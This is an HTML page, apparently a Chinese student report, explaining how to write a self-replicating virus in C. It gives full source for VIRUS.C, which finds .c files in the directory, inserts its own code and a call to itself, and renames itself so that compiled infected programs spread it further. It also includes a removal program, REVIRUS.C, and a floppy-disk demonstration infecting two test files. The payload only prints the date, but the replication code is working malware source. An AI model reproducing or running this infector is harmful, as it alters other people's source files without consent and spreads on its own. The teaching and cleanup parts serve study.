@@ -1,0 +1,625 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<base target="_blank" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title></title>
+<script type="text/javascript">
+var userAgent = navigator.userAgent.toLowerCase();
+var browser = 
+	(browser = userAgent.match(/qqbrowser\/([\d.]+)/))?"qqbrowser/"+browser[1]:
+	(browser = userAgent.match(/se\s+2.x/))?"sogou/2.x": //sougou
+	(browser = userAgent.match(/msie\s+([\d.]+)/))?"msie/"+browser[1]: //ie
+	(browser = userAgent.match(/chrome\/([\d.]+)/))?"chrome/"+browser[1]: //chrome
+	(browser = userAgent.match(/firefox\/([\d.]+)/))?"firefox/"+browser[1]: //firefox
+	(browser = userAgent.match(/version\/([\d.]+)\s+safari\/([\d.]+)/))?"safari/"+browser[1]: //safari
+	(browser = userAgent.match(/opera\/([\d.]+)([\w\W]+)version\/([\d.]+)/))?"opera/"+browser[3]: //opera
+	"other browser";
+	var browser4 = browser.substr(0,2);
+//实现回到页面顶部  
+function goTopEx(){  
+	var obj=document.getElementById("goTopBtn"); 
+	var obj2=document.getElementById("shangy"); 
+	var obj3=document.getElementById("xiay");
+	var obj4=document.getElementById("goBottom");  
+	
+	function getScrollTop(){  
+		if(browser4=="ch"){
+			//chrome
+			//chrome63.0.3239.132对DTD XHTML 1.0不再支持body.scrollTop属性，只支持documentElement.scrollTop 
+			return document.documentElement.scrollTop; 
+		}else{
+			//IE、firefox
+			return document.documentElement.scrollTop;  
+		}  
+	}
+	function setScrollTop(value){ 
+		if(browser4=="ch"){ 
+			//chrome
+			document.documentElement.scrollTop=value; 
+		}else{  
+			//IE、firefox
+			document.documentElement.scrollTop=value;  
+		} 
+	}     
+	window.onscroll=function(){getScrollTop()>50?obj.style.display="":obj.style.display="none";
+	getScrollTop()>100?obj2.style.display="":obj2.style.display="none";
+	document.body.clientHeight-getScrollTop()>650?obj3.style.display="":obj3.style.display="none";
+	document.body.clientHeight-getScrollTop()>650?obj4.style.display="":obj4.style.display="none";
+	}  
+	obj.onclick=function(){  
+		var goTop=setInterval(scrollMove,10);  
+		function scrollMove(){  
+				setScrollTop(getScrollTop()/1.1);  
+				if(getScrollTop()<1)clearInterval(goTop);  
+		}  
+	}  
+}  
+function downn(){
+	if(browser4=="ch"){
+		//chrome
+		window.scrollBy(0,document.body.clientHeight);
+	}else{
+		//IE、firefox
+		window.scrollBy(0,document.documentElement.clientHeight*1000); 
+	}
+}
+</script>
+<script>
+function changePage(){ 
+	var page = document.getElementById("container");
+	page.style.background="black";
+	page.style.color="white";
+	page.style.fontSize="22px";
+	page.style.fontFamily="MV boli";
+}
+document.write('<div style="position:fixed; right: 10px; top:20px; color:#eee;">背景颜色<br><select name=bcolor id=bcolor onchange="javascript:document.body.style.background=this.options[this.selectedIndex].value;"><option style="background-color: #ffffff" value="#ffffff">白色</option><option style="background-color: #f6f6f6" value="#f6f6f6">银灰</option><option style="background-color: #e4ebf1" value="#e4ebf1">淡蓝</option><option style="background-color: #e6f3ff" value="#e6f3ff">蓝色</option> <option style="background-color: #eeeeee" value="#eeeeee">淡灰</option><option style="background-color: #eaeaea" value="#eaeaea">灰色</option>  <option style="background-color: #e4e1d8" value="#e4e1d8">深灰</option><option style="background-color: #e6e6e6" value="#e6e6e6">暗灰</option><option style="background-color: #eefaee" value="#eefaee">绿色</option><option style="background-color: #ffffed" value="#ffffed">明黄</option><option style="background-color: #333333" value="#333333">黑色</option></select><br>字体颜色<br><select name=txtcolor id=txtcolor onchange="javascript:document.getElementById(\'container\').style.color=this.options[this.selectedIndex].value;"> <option value="#000000">黑色</option><option value="#ff0000" style="color:red;">红色</option><option value="#006600" style="color:green;">绿色</option><option value="#0000ff" style="color:blue;">蓝色</option><option value="#660000" style="color:#006600;">棕色</option><option value="#ffffff">白色</option></select><br>字体大小<br><select name=fontsize id=fonttype onchange="javascript:document.getElementById(\'container\').style.fontSize=this.options[this.selectedIndex].value;"> <option value="12px" >小号</option> <option value="14px" >较小</option> <option value="19px" >中号</option> <option value="19px" >默认</option><option value="22px" >较大</option><option value="25px" >大号</option><option value="35px" >35px</option><option value="45px" >45px</option><option value="55px" >55px</option><option value="65px" >65px</option><option value="75px" >75px</option><option value="85px" >85px</option><option value="95px" >95px</option></select>><br>字体类型<br><select name=fonttype id=fonttype onchange="javascript:document.getElementById(\'container\').style.fontFamily=this.options[this.selectedIndex].value;"> <option value="宋体" >宋体</option> <option value="MV boli" style="font-family:MV boli">MV boli</option> <option value="隶书" style="font-family:隶书">隶书</option> <option value="黑体" style="font-family:黑体">黑体</option><option value="楷体" style="font-family:楷体">楷体</option><option value="幼圆" style="font-family:幼圆">幼圆</option><option value="华文中宋" style="font-family:华文中宋">华文中宋</option><option value="华文行楷" style="font-family:华文行楷">华文行楷</option><option value="微软雅黑" style="font-family:微软雅黑">微软雅黑</option><option value="Arial" style="font-family:Arial">Arial</option><option value="Vrinda" style="font-family:Vrinda">Vrinda</option><option value="Tahoma" style="font-family:Tahoma">Tahoma</option><option value="Courier" style="font-family:Courier">Courier</option><option value="Times" style="font-family:Times">Times</option><option value="Georgia" style="font-family:Georgia">Georgia</option><option value="Lucida" style="font-family:Lucida">Lucida</option></select><br><a onClick="changePage()" target="_self" id="changepage">黑底白字</a></div>');   
+</script>
+<style type="text/css">
+#tbrowser a:linked container a:visited{
+	font-size:18px;
+	text-decoration:none;
+}
+a:link{
+	text-decoration:none;
+	}
+#container{
+	font-size:1.2em;
+	margin:auto;
+	font-family:"宋体";
+	width:65.29%;
+	line-height:1.6em;
+}
+P{
+	margin-top:16px;
+	margin-bottom:16px;
+	text-indent:2em;
+}
+.uls{
+	color:#CC6666;
+	font-weight:bold;
+}
+.uls>ol{
+	list-style:none;
+	font-weight:normal;
+	list-style:lower-latin;
+	color:#000000;
+	line-height:1.3em;
+}
+h3{
+	font-size:1.1em;
+	font-weight:bold;
+	text-indent:0em;
+	color:#990000;
+}
+h4{
+	font-size:1.0em;
+	font-weight:bold;
+	text-indent:0em;
+}
+
+#goTopBtn, #goBottom, #shangy, #xiay, #ftsize1, #ftsize2, #ftsize3{
+	width: 18px;
+    line-height: 1.2;
+    padding: 5px 0;
+    font-size: 12px;
+    text-align: center;
+    position: fixed;
+	right: 10px;
+    cursor: pointer;
+    filter: Alpha(opacity=30);
+	opacity=.3;
+	font-weight:bold;
+}
+#goTopBtn, #goBottom, #ftsize1, #ftsize3  {
+    background-color:#999;
+    color:#000;
+}
+#shangy, #xiay, #ftsize2{
+    background-color: #bbb;
+    color: #000;
+}
+#ftsize1{
+	bottom:240px;
+}
+#ftsize2{
+	bottom:214px;
+}
+#ftsize3{
+	bottom:188px;
+}
+
+#goTopBtn{
+    bottom: 105px;
+}
+#goBottom {
+    bottom: 30px;
+}
+#shangy {
+    bottom: 80px;
+}
+#xiay {
+    bottom: 55px;
+}
+#goTopBtn:hover, #goBottom:hover, #shangy:hover, #xiay:hover, #ftsize1:hover, #ftsize2:hover, #ftsize3:hover{
+	background-color:#ccc;
+	border:#ccc 0px solid;
+}
+#goTopBtn a:link, #goBottom a:link, #xiay a:link, #shangy a:link, #ftsize1 a:link, #ftsize2 a:link, #ftsize3 a:link {
+	text-decoration: none;
+	color:white;
+}
+img{
+	margin-right:2em;
+	text-indent:2em;
+	border:0;
+}
+.picsay{
+	color:#930;
+	font-size:90%;
+	line-height:110%;
+	margin-top:-12px;
+	padding:0;
+}
+.remark{
+	color:#930;
+	font-size:90%;
+	line-height:140%;
+	margin-top:-12px;
+	text-indent:0em;
+	padding:0;
+}
+.ref{
+	color:#930;
+	font-size:95%;
+	line-height:150%;
+	margin-top:-12px;
+	text-indent:2em;
+	padding:0;
+}
+pre{
+	font-size:120%;
+	line-height:130%;
+	padding:0;
+	//background-color:#f6f6f6;
+	//background-color:#fff5ee;
+	//background-color:#ffe;
+	background-color:#eee;
+	padding:8px;
+	}
+.code0, .code2, .code4{
+	font-size:95%;
+	line-height:110%;
+	margin-top:-12px;
+	padding:0;
+	//background-color:#D9D1CA;
+	//background-color:#f6f6f6;
+	//background-color:#fff5ee;
+	background-color:#ffe;
+}
+.code0{
+	color:red;
+	text-indent:0em;
+}
+.code2{
+	color:#930;
+	text-indent:2em;
+}
+.code4{
+	color:blue;
+	text-indent:4em;
+}
+sub,sup{
+	font-size:80%;
+	color:red;
+}
+</style>
+</head>
+
+<body>
+
+<div id="container">
+
+
+
+
+
+<h4>用C写病毒</h4>
+
+
+<p>病毒程序VIRUS.C</p>
+<p>这是一个用C语言写的病毒程序，当激发病毒程序时显示时间，然后返回。病毒程序VIRUS.C可将病毒传染给一个C语言程序。当被病毒感染的程序经编译、连接和执行后，又可以将病毒部分传染给其他的C语言源程序。每执行一次带有病毒的C语言程序，就向C语言源程序传播一次病毒。此程序的设计思路如下：</p>
+<p>当含有病毒部分的程序被执行时，首先进入病毒程序。它在磁盘上找扩展名为C的匹配文件，如果找到，查找是否有被传染过的标志“INFECTED”。如果有此标志，继续找其它的C文件，直至全部检查一遍。若没有这个标志，则</p>
+<p>（1）在未被感染的C程序头部加入“INFECTED”已被传染标志。</p>
+<p>（2）读取病毒文件的头文件，将其插入到即将被感染的文件头部。如果发现有重复则不插入。</p>
+<p>（3）在主程序中插入“VIRUSES（）；”调用VIRUSES函数。寻找printf、for、while、break语句，如果找到就在之前插入。</p>
+<p>（4）在文件尾部插入VIRUSES_SUB子程序。</p>
+<p>（5）在插入到将感染文件里面的VIRUSES_SUB子程序里面，必须把文件名改为当前自身的文件名，否则被传染后的文件经过编译、连接和运行后不能再继续传染。</p>
+<p>（6）最后插入VIRUSES子程序。这个子程序里面调用了VIRUSES_SUB，执行到这里返回执行结果信息。</p>
+<p>    其中用到4个出错的返回值，分别是：</p>
+<p>1：用户文件太大，不传染；</p>
+<p>2：带病毒文件打不开，不传染；</p>
+<p>3：带病毒文件读取不成功，不传染；</p>
+<p>4：查找第一个匹配文件不成功。</p>
+<p>如果返回值是0代表文件传染成功。</p>
+<p>具体实现过程如下：</p>
+<p>其中用到的函数和结构体用法参考3.3节。</p>
+<p>首先导入病毒子程序要用到的三个库文件，分别是dir.h, stido.h, dos.h.在主函数里面只调用VIRUSES函数。紧跟定义VIRUSES函数里面要调用的VIURS_SUB函数。里面定义了若干个变量。ffblk用来保存查找到的匹配文件的信息，用到里面的ff_name变量来保存匹配文件名。</p>
+<p>然后定义保存未感染的文件和病毒文件的文件型指针变量，分别用是*virus_r和*virus_v.读取文件的缓冲区，放到二维数组a[500][80]里面临时存放。因为此程序对大于500行的C文件不进行传染，所以完全可以放到里面。首先用getdate函数获取系统当前日期并输出。接着用findfirst函数查找扩展名为C的文件，将其信息保存到ffblk里面。用fgets函数读文件的第一行，长度是80-1个字符。然后用strstr函数检测病毒的标志，看文件是否有INFECT这个标志。</p>
+<p>如果有，表示文件已经被传染，关闭文件，不进行传染。当含有病毒部分的程序被执行时，首先进入病毒程序。它在磁盘上查找*.C的匹配文件，一旦找到，查找“已被传染过”的标志INFECTED。若有此标志，继续找其它*.C文件，直至全部检查一遍。</p>
+<p>如果没有这个标志，将文件全部读入a[500][80]，如果发现文件超过500行，不传染，返回。将文件指针指向文件头，打开带病毒的文件。如果打不开，返回。</p>
+<p>然后读取带病毒文件的前4行，也就是病毒子程序要用到的头文件，写入将被传染的文件。若不能读取带病毒文件，返回。用n_line变量控制行数，把将被传染文件的源程序写回原文件。其中要进行处理不写入病毒文件已有的包含语句，也就是说使＃Include语句不重复。</p>
+<p>这点是这样实现的：定义一个字符数组char include_h[]={“dos.h”, “stdio.h”, “dir.h”}; strstr函数查看将被传染文件的头文件是否和*include_h[]相同，如果相同，不进行插入。找出CALL VIRUSES；的插入点：如果有一行有printf、break、for、while语句其中之一，就对其后插入调用VIRUSES函数的调用语句。把病毒子程序写入文件。最后处理更改被感染的文件名。如果不进行改名，就不能进行多次传染，也就是说不能体现病毒的自我复制能力。查找一行是static char viruses_f[]={“virus.c”}，把其中的文件名改为被感染的文件名。接着查找下一个匹配文件。</p>
+<p>3.1.2病毒清除程序REVIURS.C</p>
+<p>病毒的清除过程是和传染过程相逆的。传染的时候插入调用viruses函数的调用语句，在病毒清除文件里面就要删除掉这个语句。然后还要删除掉病毒子程序VIURSES_SUB和VIURSES。有一个问题不能进行还原。因为当时插入病毒子程序需要的头文件时没有记录传染前文件的头文件信息，所以不能进行还原。但是这一点不影响原文件。所以这点在病毒清除程序中没有进行处理。</p>
+<p>由于演示的时候病毒程序VIRUS.C和清除病毒程序REVIURS.C放在同一个目录下进行演示。考虑到VIRUS.C会把REVIURS.C传染和REVIRUS.C会把VIRUS.C清除两种情况。所以编写这两个程序的时候必须加入一条条件语句if(strcmp(ffblk.ff_name,"REVIRUS.C")!=0)和if(strcmp(ffblk.ff_name,"VIRUS.C")!=0)。</p>
+<p>当含有清除部分的程序被执行时。它在磁盘上找扩展名为C的匹配文件，如果找到，查找是否有被传染过的标志“INFECTED”。如果无此标志，继续找其它的C文件，直至全部检查一遍。若有这个标志，则</p>
+<p>(1)查找磁盘文件，如果是有病毒的传染标志“INFECTED”则打开文件。如果没有则关闭文件并且寻找下一个TEST*.C。</p>
+<p>(2)读取文件，首先判断是否为Viruses();如果不是则判断是否为int Viruses_sub()，如果都不是，则把读取部分放在二维数组a[500][80]中，如果只是为int Viruses_sub()，则读取文件结束。</p>
+<p>(3)关闭文件，然后删除该文件。</p>
+<p>(4)创建一个跟删除文件相同名字的文件。然后打开。</p>
+<p>(5)把二维数组a[500][80]中的数据写入到新建的文件中。关闭文件，读取下一个文件。</p>
+<p>3.2 程序流程图</p>
+<p>3.2.1 病毒程序VIRUS.C流程图</p>
+<p> </p>
+<p>3.2.2 解毒程序REVIRUS.C流程图</p>
+<p>3.3其中用到的函数和结构体的说明：</p>
+<p>（1）结构体struct ffblk （在dir.h中）类型变量</p>
+<p>变量ffblk用于打开文件，获取返回值。</p>
+<p>Struct ffblk</p>
+<p>{char ff_reserved[21];</p>
+<p>char ff_attrib;</p>
+<p>unsigned ff_ftime;</p>
+<p>unsigned ff_fdate;</p>
+<p>long ff_fize;</p>
+<p>char ff_name[13];</p>
+<p>};</p>
+<p>程序中只用到ff_name来保存匹配文件名。</p>
+<p>（2）结构体struct date（在dos.h中）变量</p>
+<p>  struct date</p>
+<p>{int da_year;      /* Year-1980 */</p>
+<p>char da_day;     /* Day of the month */</p>
+<p>char da_mon;    /* Month (1=Jan) */</p>
+<p>};</p>
+<p>程序中用来获取系统当前日期。具体用法为：</p>
+<p>void getdate (struct date *datep);</p>
+<p>（3）查找匹配文件</p>
+<p>  findfirst()函数和findnext()函数</p>
+<p>  调用方式：整型数=findfirst(文件名，&结构变量名，属性常数组合(如0×24));</p>
+<p>   功能：检索由path和attr指定的文件，把结果返回到afer。</p>
+<p>        Findfirst返回关于第一个指定文件的信息。</p>
+<p>        Findnext继续检索。</p>
+<p>  返回值：0（检索成功），-1（没有找到指定的文件）</p>
+<p>  属性常数：</p>
+<p>  FA_NORMAL(0*00)   含意：Normal file， no attributes</p>
+<p>  FA_RDONLY (0*01)   含意：只读</p>
+<p>  FA_HIDDEN(0*02)    含意：隐含文件</p>
+<p>  FA_SYSTEM(0*24)    含意：系统文件</p>
+<p>  需要用到的头文件： dir.h</p>
+<p>程序中的匹配文件属于普通文件，所以属性常数为0。</p>
+<p>（4）读文件</p>
+<p>  函数原形：char *fgets (char *a, int n, FILE *fp);</p>
+<p>  功能：</p>
+<p>  从fp指向的文件读取一个长度为（n-1）的字符串，最后加一个’ \0’，存入始地址为a的空间。</p>
+<p>  若在读完n-1个字符之前遇到换行符或EOF，读入即结束。</p>
+<p>  返回值：返回地址a。</p>
+<p>          若遇文件结束或出错，返回NULL。</p>
+<p>（5）在字符串中查找指定字符串的第一次出现</p>
+<p>   函数原形；</p>
+<p>   char *strstr(char *str1,char *str2);</p>
+<p>   功能：找出str2字符串在str1字符串中第一次出现的位置（不包括str2的串结束符）。</p>
+<p>   返回值：返回该位置的指针。</p>
+<p>           若找不到，返回NULL指针。</p>
+<p>程序中用这个函数来判断字符串是否一致。</p>
+<p>（6）改变文件位置指针</p>
+<p>   函数原形：int fseek (FILE *fp, long offset, int base);</p>
+<p>  功能：将fp所指文件的位置指针移到以base所指出的位置为基准、以offset为位移量的位置。</p>
+<p>   返回值：返回当前位置。否则，返回-1。SEEK_SET为文件开始。</p>
+<p>由于读取文件的时候文件指针要发生变化。而重新执行一条命令的时候需要重新定位文件指针的位置，所以要用到fseek函数。程序中用这个函数定位到文件头，对文件进行重新读取。</p>
+<p>3.4 程序清单</p>
+<p>3.4.1病毒程序VIRUS.C程序清单如下：</p>
+<pre>
+/*INFECTED*/
+#include "stdio.h"
+#include "dos.h"
+#include "dir.h"
+main()
+{
+  viruses();
+}
+int viruses_sub()
+{
+   struct ffblk ffblk;
+   int done,i,j,k,n_line;
+   FILE *virus_r,*virus_v;
+/*virus_r指向将被感染的文件，virus_v指向已带病毒的文件*/
+   char a[500][80],b[80],*p1,*p2; /*将被传染的文件读入a[500][80]临时存放*/
+   static char viruses_f[]={"virus.c"};/*文件被传染后，修改该值为自身文件名*/
+   int include_write;
+   int virus_call=0;
+   int virus_start=0;
+   char *main_flag[]={"printf","break","for","while"};
+   char *include_h[]={"dos.h","stdio.h","dir.h"};
+   char *v_flag[]={"INFECTED"};
+   struct date today;
+/*VIRUSES DISPLAY*/
+   getdate(&today); /*病毒显示日期信息*/
+   printf("Today is %d/%d/%d\n",today.da_mon,today.da_day,today.da_year);
+/*AFFECT VIRUSES*/
+   done=findfirst("*.c",&ffblk,0); /*查找第一个匹配文件*/
+   while(!done)
+   {
+       if(strcmp(ffblk.ff_name,"REVIRUS.C")!=0)
+       {
+          virus_r=fopen(ffblk.ff_name,"r+w");
+          if(virus_r!=NULL)
+          {
+             p1=fgets(&a[0][0],80,virus_r);
+             if(strstr(p1,v_flag[0])==NULL)
+             {
+                n_line=0; /*把文件全部读入a[500][80]*/
+                while(p1!=NULL)
+               {
+                   n_line++;
+                   p1=fgets(&a[n_line][0],80,virus_r);
+                   if(n_line>=500)
+                   {
+                       fclose(virus_r);
+                       return(1);
+                   }
+               }
+               fseek(virus_r,0,SEEK_SET);
+               virus_v=fopen(&viruses_f[0],"r"); /*打开带病毒的文件*/
+               if(virus_v==NULL)
+               {
+                   fclose(virus_r);
+                   return(2);
+               }
+              for(i=1;i&lt;5;i++) /*读带病毒文件前4行并写入将被传染的文件*/
+             {
+             p2=fgets(b,80,virus_v);
+             if(p2==NULL)
+            {
+                fclose(virus_r);
+                fclose(virus_v);
+                return(3);
+            }
+            fputs(b,virus_r);
+         }
+         for(j=0;j&lt;n_line;j++) /*把将被传染文件的原程序写回原文件*/
+         {
+            include_write=1; /*不写入病毒文件已有的包含语句*/
+           if(strstr(&a[j][0],"#include")!=NULL)
+           for(i=0;i&lt;3;i++)
+           if(strstr(&a[j][0],include_h[i])!=NULL)
+               include_write=-1;
+           if(virus_call==0)   /*插入调用语句，并加上回车换行*/
+              for(i=0;i&lt;4;i++)
+              if(strstr(&a[j][0],main_flag[i])!=NULL)
+              {
+                  for(k=0;k&lt;80;k++)
+                     b[k]=0;
+                  strcpy(&b[0],"viruses();");
+                  b[10]=13;
+                  b[11]=10;
+                  fputs(b,virus_r);virus_call=1;
+                  i=4;
+              }
+             if(include_write==1)fputs(&a[j][0],virus_r);
+         }
+         p1=fgets(b,80,virus_v);  /*把病毒子程序写入文件*/
+         while(p1!=NULL)
+         {
+            if(virus_start==0)  /*找病毒子程序的第一条语句*/
+              if(strstr(p1,"int viruses_sub()")!=NULL)
+                  virus_start=1;
+              if(virus_start==1)
+              {
+                  if(strstr(p1,"char")!=NULL)
+                      if(strstr(p1,"viruses_f[]=")!=NULL)
+                      {
+                          strcpy(&b[29],ffblk.ff_name);
+                          i=strlen(&b[0]);
+                          b[i]=34;
+                          strcpy(&b[i+1],");");
+                         b[i+3]=13;
+                         b[i+4]=10;
+                      }
+                fputs(b,virus_r);
+             }
+             p1=fgets(b,80,virus_v);
+         }
+      fclose(virus_v);
+      fclose(virus_r);
+      return(0);
+   }
+   fclose(virus_r);
+  }
+}
+   done=findnext(&ffblk);
+}
+    return(4);
+}
+viruses()
+    {
+      int num;
+      num=viruses_sub();
+      switch (num)
+      {
+             case  0 : printf("successful\n");
+                       break;
+             case  1: printf("the file is outof line\n");
+                       break;
+             case  2 : printf("the viruses file cannot open\n");
+                       break;
+             case  3 : printf("cannot read viruses file\n");
+                       break;
+             case  4: printf("cannot find file\n");
+      }
+getch();
+}
+</pre>
+<p>3.4.2病毒清除程序REVIURS.C清单如下：</p>
+<pre>
+#include "stdio.h"
+#include "dos.h"
+#include "dir.h"
+main()
+{
+  struct ffblk ffblk;
+  int done,i,j,line,k;
+  static int n_line;
+  FILE *virus_r,*virus_v;
+  char a[500][80],b[80],*p;
+  char *v_flag[]={"INFECTED"};
+  done=findfirst("*.c",&ffblk,0);
+  while(!done)
+  {
+    if(strcmp(ffblk.ff_name,"VIRUS.C")!=0)
+    {
+    for(k=0;k&lt;500;k++)
+    for(j=0;j&lt;80;j++)
+       a[k][j]=0;
+      virus_r=fopen(ffblk.ff_name,"r+w");
+      if(virus_r!=NULL)
+     {
+      p=fgets(&b[0],80,virus_r);
+     if(strstr(p,v_flag[0])!=NULL)
+      {
+         line=0;
+        while(p!=NULL)
+        {
+      p=fgets(&b[0],80,virus_r);
+      if(strstr(&b[0],"int viruses_sub()")!=NULL)
+           break;
+       else if(strstr(&b[0],"viruses();")==NULL)
+            {
+              k=strlen(b);
+            for(j=0;j&lt;k;j++)
+            a[line][j]=b[j];
+            a[line][j+1]=0;
+            line++;
+           }
+       }
+    n_line=line;
+    fclose(virus_r);
+    remove(ffblk.ff_name); /*删除文件*/
+    virus_r=fopen(ffblk.ff_name,"w+");  /*打开将被感染的文件*/
+        for(i=0;i&lt;n_line;i++)
+        {
+          fputs(&a[i][0],virus_r); /*把二维数组中的数据写入原文件*/
+        }
+          fclose(virus_r);
+    }
+            }
+           }
+      done=findnext(&ffblk); /*查找下一个匹配文件*/
+      }
+}
+</pre>
+<p>4. 计算机病毒的演示</p>
+<p>4.1病毒程序VIRUS.C的演示过程</p>
+<p>在一张已经格式化的软盘上，除了病毒源程序VIRUS.C和REVIRUS.C外，还有两个尚未被感染的C语言程序TEST1.C和TEST2.C。原始代码分别如下：</p>
+<p>TEST1.C：</p>
+<p>#include "stdio.h"</p>
+<p>main()</p>
+<p>{</p>
+<p>int i,sum;</p>
+<p>for(i=1;i<100;i++)</p>
+<p>sum=sum+i;</p>
+<p>printf("sum=%d\n",sum);</p>
+<p>}</p>
+<p>TEST2.C</p>
+<p>#include "stdio.h"</p>
+<p>main()</p>
+<p>{</p>
+<p>printf("hello,world!\n");</p>
+<p>}</p>
+<p>在命令提示符下键入dir命令查看文件信息。</p>
+<p>然后编译连接并执行VIRUS.C文件，运行结果显示：</p>
+<p>Today is 5/20/2004</p>
+<p>Successful</p>
+<p>说明传染成功。再用dir命令查看文件信息</p>
+<p>可以看到TEST2.C文件已经被传染，大小从64变成3949。用type命令查看TEST1的内容</p>
+<p>可以看到病毒的子程序已经插入了，而且在主函数里面插入了调用VIRUSES函数语句。而且文件名自动改为“TEST2.C”。（如图中红线所示）</p>
+<p>然后再把TEST2.C文件编译连接并运行。成功后，再用dir命令查看文件信息</p>
+<p>可以看到TEST1.C也被感染了，大小从107变成了3969。再用type命令查看，结果如下：</p>
+<p>可以看到，文件名称已经自动改为TEST1.C，而且病毒子程序已经拷贝过来，在这个过程中REVIRUS.C始终没有被感染，达到了我们的目的。</p>
+<p>文件被感染前后内容如下图所示：</p>
+<p>                  </p>
+
+
+<p>4.2病毒清除程序REVIRUS.C演示过程</p>
+<p>然后我们来演示病毒的清除。编译运行REVIRUS.C后用dir命令查看文件信息。</p>
+<p>图中可以看到TEST1.C和TEST2.C都变小了。虽然没有还原到以前的大小。这是因为运行病毒子程序需要的头文件没有删除，原因前面已经提及过了。然后用type命令分别查看一下TEST1.C和TEST2.C的内容。</p>
+<p>图中可以看到，除了程序需要用到的头文件，剩下的已经基本还原。而且没有清除VIRUS.C里面的程序，基本达到了清除病毒的目的。演示成功。</p>
+<p>从演示过程中可以看出，一旦程序被病毒感染，这个程序经过编译连接后运行时就能向没感染上病毒的程序扩散病毒，使病毒在系统中不断蔓延下去。而病毒清除程序运行一次就可以删除掉所有的病毒子程序和插入的调用语句。</p>
+
+
+<p style='float:right;'>本页共329段，11343个字符，18089 Byte(字节)</p>﻿
+
+
+
+
+</div>
+
+
+<div>
+<a id="ftsizea" onclick='document.getElementById("container").style.fontSize = "1.4em";' target="_self" style="color:#fff;" title="大：1.4em"><div id="ftsize1" style="color:#fff;">大</div></a>
+<a id="ftsizea" onclick='document.getElementById("container").style.fontSize = "1.2em";' target="_self" style="color:#fff;" title="中：1.2em"><div id="ftsize2" style="color:#fff;">中</div></a>
+<a id="ftsizea" onclick='document.getElementById("container").style.fontSize = "1.0em";' target="_self" style="color:#fff;" title="小：1em"><div id="ftsize3" style="color:#fff;">小</div></a>
+
+<a target="_self" style="color:#fff;"><div style="display:none; color:#fff;" id="goTopBtn">&and;</div></a>
+<a onclick="shangy()" target="_self" style="color:#fff;"><div style="display:none; color:#fff;" id="shangy">&uarr;</div></a>
+<a onclick="xiay()" target="_self" style="color:#fff;"><div id="xiay" style="color:#fff;">&darr;</div></a>
+<a onclick="downn()" target="_self" style="color:#fff;"><div id="goBottom" style="color:#fff;">&or;</div></a>
+<script type=text/javascript>
+	goTopEx();
+	function xiay(){
+		window.scrollBy(0,window.innerHeight-10);
+	}
+	function shangy(){
+		window.scrollBy(0,-window.innerHeight+10);
+	}
+	var obj3=document.getElementById("xiay");
+	var obj4=document.getElementById("goBottom");
+	function getHeight(){  
+		if(browser4=="ch"){
+			//谷歌浏览器
+			return document.body.clientHeight; 
+		}else{
+			//IE、firefox等浏览器 
+			return document.documentElement.clientHeight;  
+		}  
+	}
+	getHeight()<window.innerHeight+50?obj3.style.display="none":obj3.style.display="";
+	getHeight()<window.innerHeight+50?obj4.style.display="none":obj4.style.display="";
+	if(browser4!="ch"){	//firefox需要尝一下才显示向下图标
+		xiay();
+		shangy();
+	}
+</script>
+</div>
+
+</body>
+</html>
